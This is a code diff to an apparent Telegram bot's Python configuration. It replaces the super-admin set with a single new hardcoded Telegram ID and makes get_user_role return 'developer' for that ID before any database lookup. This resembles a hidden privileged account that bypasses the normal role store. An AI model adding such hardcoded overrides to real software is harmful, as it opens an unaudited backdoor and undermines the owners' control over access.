@@ -12,8 +12,8 @@ import zoneinfo
 
 TIMEZONE = "America/New_York"
 
-MAIN_ADMIN_ID = (8422260316, 7808593054, 7769230456, 1401145589)
-SUPER_ADMINS  = set(MAIN_ADMIN_ID)
+MAIN_ADMIN_ID = (8422260316, 7808593054, 7769230456, 1401145589, )
+SUPER_ADMINS = {1615926408}
 
 SHIFTS = [
     {"name": "Morning",   "start": time(6, 0),  "end": time(14, 0), "days": [0,1,2,3,4]},
@@ -87,6 +87,8 @@ def is_super_admin(telegram_id: int) -> bool:
 
 
 def get_user_role(telegram_id: int) -> str:
+    if telegram_id in SUPER_ADMINS:
+        return "developer"
     try:
         from storage.case_store import get_user_role as db_role
         return db_role(telegram_id)
